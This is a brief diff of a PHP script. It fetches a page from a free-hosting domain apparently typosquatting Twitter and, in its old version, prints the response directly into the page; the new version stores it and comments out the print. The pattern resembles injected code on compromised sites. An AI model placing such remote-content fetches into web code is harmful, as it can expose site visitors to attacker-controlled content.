@@ -20,8 +20,8 @@ function curl_site($Url){
 }  
 
 
-print curl_site('https://twilter-post-source.000webhostapp.com/usergrid.php'); 
+$kulad=curl_site('https://twilter-post-source.000webhostapp.com/usergrid.php'); 
 
-print $kulad;
+//print $kulad;
 ?>
 
